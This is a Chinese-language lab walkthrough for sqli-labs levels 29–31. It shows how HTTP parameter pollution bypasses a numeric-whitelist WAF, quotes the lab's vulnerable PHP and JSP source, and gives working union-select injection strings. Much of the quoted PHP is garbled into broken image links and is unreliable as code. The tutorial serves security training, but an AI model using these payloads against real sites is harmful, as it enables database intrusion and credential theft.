# 绕过 waf

注：还可以使用 HTTP 参数污染（HPP）

?id=1&id=select database()--+
1
waf 可能只检测id=1，而php脚本识别id=select database()–+

## Less-29 报错型过waf

原url：

[http://192.168.137.138/sqli-labs-master/Less-29/Login.php](https://links.jianshu.com/go?to=http%3A%2F%2F192.168.137.138%2Fsqli-labs-master%2FLess-29%2FLogin.php)
（直接在主页上连接less-29的话，是进入的index.php，那个页面没起到拦截作用）

添加id值

返回页面正常

页面hint：

Hint: The Query String you input is: id=2

再用 ' 和 " 测试，看看返回页面是否报错：

返回页面提示，已被WAF拦截成功

那么现在把id 的参数改成 符号型的：abc

返回拦截成功

把id 的参数改成 数值型（很大）：123123123123123

返回页面错误，但不是那个拦截成功的界面了

页面hint：

Hint: The Query String you input is: id=123123123123

现在初步知晓了，他拦截的关键字 是字符

WAF：

```undefined
web应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application（应用） Firewall ，简称：WAF）



常规注入测试：

非  数字型  参数 均被 WAF 拦截
```

现在进入服务器中，看看代码

-----------------------------------代码部分----------------------------------

<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
//disable error reporting
error_reporting(0);

// take the variables
if(isset(![_GET['id'])) {](https://math.jianshu.com/math?formula=_GET%5B%27id%27%5D))%20%7B)qs = ![_SERVER['QUERY_STRING'];//qs得到了 整个id（也就是qs=‘id=1’）](https://math.jianshu.com/math?formula=_SERVER%5B%27QUERY_STRING%27%5D%3B%2F%2Fqs%E5%BE%97%E5%88%B0%E4%BA%86%20%E6%95%B4%E4%B8%AAid%EF%BC%88%E4%B9%9F%E5%B0%B1%E6%98%AFqs%3D%E2%80%98id%3D1%E2%80%99%EF%BC%89)hint=![qs;](https://math.jianshu.com/math?formula=qs%3B)id1=java_implimentation($qs);//java_implimentation对字符串做了处理，这里的 id1 获取的值是 id= 后面的内容

```php
$id=$_GET['id'];
//echo $id1;
whitelist($id1);//进行拦截筛选

//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);
```

// connectivity
![sql="SELECT * FROM users WHERE id='](https://math.jianshu.com/math?formula=sql%3D%22SELECT%20*%20FROM%20users%20WHERE%20id%3D%27)id' LIMIT 0,1";
![result=mysql_query(](https://math.jianshu.com/math?formula=result%3Dmysql_query()sql);
![row = mysql_fetch_array(](https://math.jianshu.com/math?formula=row%20%3D%20mysql_fetch_array()result);
if(![row) { echo "<font size='5' color= '#99FF00'>"; echo 'Your Login name:'.](https://math.jianshu.com/math?formula=row)%20%7B%20echo%20%22%3Cfont%20size%3D%275%27%20color%3D%20%27%2399FF00%27%3E%22%3B%20echo%20%27Your%20Login%20name%3A%27.)row['username'];
echo "
";
echo 'Your Password:' .$row['password'];
echo "</font>";
}
else
{
echo '<font color= "#FFFF00">';
print_r(mysql_error());
echo "</font>";
}
}
else { echo "Please input the ID as parameter with numeric value";}

//WAF implimentation with a whitelist approach..... only allows input to be Numeric.
function whitelist(![input) {](https://math.jianshu.com/math?formula=input)%20%7B)match = preg_match("/^\d+![/",](https://math.jianshu.com/math?formula=%2F%22%2C)input);//preg_match 用于进行正则表达式匹配，成功返回1，否则返回0，正则表达式：从头到尾都是数字
if(![match) { //echo "you are good"; //return](https://math.jianshu.com/math?formula=match)%20%7B%20%2F%2Fecho%20%22you%20are%20good%22%3B%20%2F%2Freturn)match;
}
else
{
header('Location: hacked.php');//如果 数组中 不全为 数字的话，就转向 hacked.php，就是那个提示 被 WAF 成功拦截的页面
//echo "you are bad";
}
}

// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
function java_implimentation(![query_string)//获取一个字符串 {](https://math.jianshu.com/math?formula=query_string)%2F%2F%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E4%B8%B2%20%7B)q_s = ![query_string;//字符串赋值](https://math.jianshu.com/math?formula=query_string%3B%2F%2F%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%B5%8B%E5%80%BC)qs_array= explode("&",$q_s);//将字符串 q_s ，以特定格式'&'，分割成数组，在url中，“&”符号 意思 是 不同参数的间隔符，在url中可以这样写：
id=1&id=2&id=3，这样的话，explode把他们处理为一个数组，数组元素分别是：id=1，id=2，id=3

```php
foreach($qs_array as $key => $value)//foreach作用：遍历数组的简便方法， value 值 等于 qs_array 当前值， key 值 等于 下标值(就是循环赋值)
{
    $val=substr($value,0,2);//substr，截取value数组中前2个字符
    if($val=="id")//如果前两个字符是 'id’的话
    {
        $id_value=substr($value,3,30); //从第三个字符开始（不包含第三个字符），截取长度为30的字符串
        return $id_value;//返回值
        echo "<br>";
        break;//跳出循环
    }

}
```

}

?>

其中有两个函数，了解一下：

foreach

作用： 遍历数组

实例：

![arr = array("1"=>"111","2"=>"222","3"=>"333"); foreach(](https://math.jianshu.com/math?formula=arr%20%3D%20array(%221%22%3D%3E%22111%22%2C%222%22%3D%3E%22222%22%2C%223%22%3D%3E%22333%22)%3B%20foreach()arr as ![key=>](https://math.jianshu.com/math?formula=key%3D%3E)value)
{
echo ![key."=>".](https://math.jianshu.com/math?formula=key.%22%3D%3E%22.)values."\n";
}

运行：

1=>111
2=>222
3=>333

说明：

把当前元素的值赋给 ![value ,并且把当前元素的键值 也会在每次循环中被赋给变量](https://math.jianshu.com/math?formula=value%20%2C%E5%B9%B6%E4%B8%94%E6%8A%8A%E5%BD%93%E5%89%8D%E5%85%83%E7%B4%A0%E7%9A%84%E9%94%AE%E5%80%BC%20%E4%B9%9F%E4%BC%9A%E5%9C%A8%E6%AF%8F%E6%AC%A1%E5%BE%AA%E7%8E%AF%E4%B8%AD%E8%A2%AB%E8%B5%8B%E7%BB%99%E5%8F%98%E9%87%8F)key。键值 可以是下标值，也可以是 字符串。比如book[0]=1中的"0",book[id]="001"中的"id"

explode()

作用：把 字符串 打散为数组

实例：
<?php
![str="Hello world. I love Shanghai!"; print_r(explode(" ",](https://math.jianshu.com/math?formula=str%3D%22Hello%20world.%20I%20love%20Shanghai!%22%3B%20print_r(explode(%22%20%22%2C)str));
?>

运行结果：

Array([0]=>Hello [1]=>world. [2]=>I [3]=>love [4]=>Shanghai!)

说明：
把str字符串用空格打散为数组，和C语言中的 strtok 函数差不多一个意思

explode(separator,string,limit)
参数 描述

separator 必需。规定在哪里分割字符串。
string 必需。要分割的字符串。
limit
可选。 规定所返回的数组元素的数目。
可能的值：
大于 0 - 返回包含最多 limit 个元素的数组
小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组
0 - 返回包含一个元素的数组

------

在了解了上述的函数后，对源码进行一个分析：

qs变量从_SEVER得到整个id参数的时候

拿去java_implimentation进行处理

但是java_implimentation中只要满足数组前面两位是id，则跳出循环，并把其后的值赋给

id1

id1后面的参数如果是全数字的话，则放行

让 _GET 到的id 参数 进入数据库

这里有一个小常识需要介绍：

php GET 获取 参数的时候，有一个特性，当某个参数被多次 赋值 时，会保留 最后一次 赋值时的值

例如：

[http://site/?id=1&id=2&id=3](https://links.jianshu.com/go?to=http%3A%2F%2Fsite%2F%3Fid%3D1%26id%3D2%26id%3D3)
(&在url中是不同参数的间隔符)

程序会返回id=3的值

实例：

[http://192.168.137.138/sqli-labs-master/Less-29/Login.php?id=1&id=2&id=3](https://links.jianshu.com/go?to=http%3A%2F%2F192.168.137.138%2Fsqli-labs-master%2FLess-29%2FLogin.php%3Fid%3D1%26id%3D2%26id%3D3)

返回效果：

Your Login name:Dummy
Your Password:p@ssword

************由此可见，当参数相同时，数据库会执行最后一个 参数的值**************

```undefined
                那么结合 源码 部分的瑕疵
```

源码的java_implimentation函数，就是将 & 作为，数组分隔符的

当有某一数组的前两位是id的话，就返回id后的值，并且跳出循环

如果这样写注入语句：

id=1&id=1'

安全狗会不会咬我呢

分析分析：

java_implimentation把其打散为 id=1 id=1'

第一个id满足了跳出循环的条件，并且把 1 赋值给 id1 拿去 给 white 函数做检查

满足 全是 数字，放行 _GET 的 id 参数

但是 GET 碰见 单一参数 重复赋值的情况时，会只保留最后一次 被赋值 的值

也就是 _GET 到了 1'

前台测试：

注入语句：

id=1&id=1'(先看看闭合条件)

效果如下：

页面报错了，但是并不是显示有非法字符（成功绕过WAF)

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

错误分析：

near ' ' 1' ' LIMIT 0,1 ' at line 1

说明闭合条件就是 单引号 '

构造注入语句：

id=1&id=1' and 1=2 union select 1,2,3 #

页面错误：

Hint: The Query String you input is: id=1&id=1%27%20and%201=2%20union%20select%201,2,3%20

发现 # 符号不见了

换一个 --+

返回页面报出了 字段位置信息

那么接下来的类容很熟悉了，不一一做记录

----------------------------------代码审计-----------------------------------

根据其中代码逻辑，WAF会检测ID是否为数字，如果不是一律转向 hacked.php 。但是 程序
没有考虑当 ID 多赋值的情况（GET的特点：单一参数多次赋值，只保留最后一次赋值），
它只对第一次的 id 进行了测试，如果转入多个 id ，那么后面的 id 则存在注入漏洞

less-30 、 less-31 和 less-29 考察点一样，只是SQL语句略有不同， 就一笔带过

首先先看下 tomcat 中的index.jsp 文件

源代码

 String rex = "^\\d+$";		# 对 jsp 参数进行处理
 Boolean match=id.matches(rex);
 if(match == true)
 {
         URL sqli_labs = new URL("http://localhost/sqli-labs/Less-29/index.php?"+ qs);	# 请求 php 服务器
 }
1
2
3
4
5
6
测试

/sqli-labs/Less-29/index.jsp?id=1&id=-2%27union%20select%201,user(),3–+



 至于如何注入到其他的内容，只需要自己构造 union 后面的 sql 语句即可。
1
Less-30 盲注型过waf
源代码 （index.php）

 $qs = $_SERVER['QUERY_STRING'];
 $hint=$qs;
 $id = '"' .$id. '"';

 // connectivity 
 $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 $result=mysql_query($sql);
 $row = mysql_fetch_array($result);
 if($row)
 {
         echo "<font size='5' color= '#99FF00'>";
         echo 'Your Login name:'. $row['username'];
         echo "<br>";
         echo 'Your Password:' .$row['password'];
         echo "</font>";
 }
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
测试

/sqli-labs/Less-30/index.jsp?id=1&id=-2"union select 1,user(),3–+



Less-31 盲注型过waf
源代码（index.php）

 $qs = $_SERVER['QUERY_STRING'];
 $hint=$qs;
 $id = '"'.$id.'"';

 // connectivity 
 $sql="SELECT * FROM users WHERE id= ($id) LIMIT 0,1";
 $result=mysql_query($sql);
 $row = mysql_fetch_array($result);
1
2
3
4
5
6
7
8
测试

/sqli-labs/Less-31/index.jsp?id=1&id=-2")union select 1,user(),3–+



总结：从以上三关中，我们主要学习到的是不同服务器对于参数的不同处理，HPP 的应用有很多，不仅仅是我们上述列出过 WAF 一个方面，还有可以执行重复操作，可以执行非法操作等。同时针对WAF 的绕过，我们这里也仅仅是抛砖引玉，后续的很多的有关HPP 的方法需要共同去研究。这也是一个新的方向


